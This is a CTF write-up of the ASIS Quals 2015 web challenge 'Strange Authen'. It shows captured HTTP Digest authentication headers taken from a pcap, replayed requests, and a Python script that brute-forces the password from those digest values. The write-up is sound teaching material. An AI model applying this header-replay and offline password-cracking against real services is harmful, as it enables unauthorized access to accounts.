# ASIS Quals CTF 2015: Strange Authen

**Category:** Web
**Points:** 225
**Solves:** 12
**Description:**

> Go [there](http://strangeauthen.asis-ctf.ir/) and find the flag.

## Write-up

After spend sometimes to find some vulnerabilities with no luck I check robots.txt, there was an important path there and it was misc folder contains pcap file. So take a look at pcap and filter with ‘http && ip.dst == 217.218.48.85’ and get some interesting packets:

	GET /login.php HTTP/1.1
	Host: strangeauthen.asis-ctf.ir
	Connection: keep-alive
	Authorization: Digest username="admin", realm="this page for admin only, go out", nonce="5549f5f40edf1", uri="/login.php", response="d9ace07007cb801fa28a3bba92ddd515", opaque="e7c2664182934b3197e2e8dc48dbcf41", qop=auth, nc=00000393, cnonce="e7c3a4eefacfefbb"
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
	User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36
	DNT: 1
	Referer: http://strangeauthen.asis-ctf.ir/
	Accept-Encoding: gzip, deflate, sdch
	Accept-Language: en-US,en;q=0.8,fa;q=0.6,de;q=0.4
	Cookie: PHPSESSID=hkgvkkaoq60v2bv613r2uouq22
	
	GET /login.php HTTP/1.1
	Host: strangeauthen.asis-ctf.ir
	Connection: keep-alive
	Authorization: Digest username="factoreal", realm="this page for admin only, go out now!", nonce="554aed8c0b2d8", uri="/login.php", response="d9b58c347f96195884ce27036f3c9546", opaque="d073cc4342291e6270746b4675498022", qop=auth, nc=00000001, cnonce="d6d1a0a39a93b4c3"
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
	User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36
	DNT: 1
	Referer: http://strangeauthen.asis-ctf.ir/index.html
	Accept-Encoding: gzip, deflate, sdch
	Accept-Language: en-US,en;q=0.8,fa;q=0.6,de;q=0.4
	Cookie: PHPSESSID=hkgvkkaoq60v2bv613r2uouq22
	
	GET /7he_most_super_s3cr3t_page.php HTTP/1.1
	Host: strangeauthen.asis-ctf.ir
	Connection: keep-alive
	Authorization: Digest username="factoreal", realm="this page for admin only, go out now!", nonce="554aed8c0b2d8", uri="/7he_most_super_s3cr3t_page.php", response="587bb0cf4968b88fdf00c8ae81ff8bf4", opaque="d073cc4342291e6270746b4675498022", qop=auth, nc=00000002, cnonce="bd65e746ecf4d7e7"
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
	User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36
	DNT: 1
	Referer: http://strangeauthen.asis-ctf.ir/login.php
	Accept-Encoding: gzip, deflate, sdch
	Accept-Language: en-US,en;q=0.8,fa;q=0.6,de;q=0.4
	Cookie: PHPSESSID=hkgvkkaoq60v2bv613r2uouq22

At first I try to login by changing Authorization with Tamper data, the first one doesn’t work the second one, BOOM…
I logged in as factorial so let see most secret page… It needs to login! Lets try the 3rd one, no luck…
So what’s the point, it’s digest access authentication so maybe I should bruteforce the password, lets ask google and the first result was Wikipedia ‘Digest access authentication’.
The example points to 3 important things:

	1. The MD5 hash of the combined username, authentication realm and password is calculated. The result is referred to as HA1.
	2. The MD5 hash of the combined method and digest URI is calculated, e.g. of "GET" and "/dir/index.html". The result is referred to as HA2.
	3. The MD5 hash of the combined HA1 result, server nonce (nonce), request counter (nc), client nonce (cnonce), quality of protection code (qop) and HA2 result is calculated. The result is the "response" value provided by the client.

We have everything except password:

	username="factoreal"
	realm="this page for admin only, go out now!"
	nonce="554aed8c0b2d8"
	uri="/login.php"
	response="d9b58c347f96195884ce27036f3c9546"
	qop=auth
	nc=00000001
	cnonce="d6d1a0a39a93b4c3"

I ask about password type and admin points to the top password lists, so I write my script to bruteforce and I just need to password list that contains our goal:

	import hashlib
	
	password = open('passwords.txt').read().splitlines()
	h2 = hashlib.md5("GET:/login.php").hexdigest()
	for i in range(len(password)):
		h1 = hashlib.md5("factoreal:this page for admin only, go out now!:" + password[i]).hexdigest()
		result = hashlib.md5(h1 + ":554aed8c0b2d8:00000001:d6d1a0a39a93b4c3:auth:" + h2).hexdigest()
		if result == "d9b58c347f96195884ce27036f3c9546":
			print "[*] Password found: " + password[i]
			exit()

I try some password list and it was really hard to find the best one, but finally it works and I find the password:

	[*] Password found: secpass

So let’s login again. It works, but stuck on visiting top secret page…  I try to sync admin content with my own, PHPSESSID and UserAgent, another try and it doesn’t work! I ask admin and he tells that I’m in right way, but why it doesn’t work! He points to change cookie date and I do it, change that to 2016 and try again, let’s check the page:

	Welcome factoreal, nice to see you again!
	Congratz! Great you found me!

And here is the Flag:

	ASIS{004efe5ec5867811f4f13bc8f9921517}

## Other write-ups and resources

* <https://ucs.fbi.h-da.de/writeup-asis-ctf-quals-2015-strange-authen/>
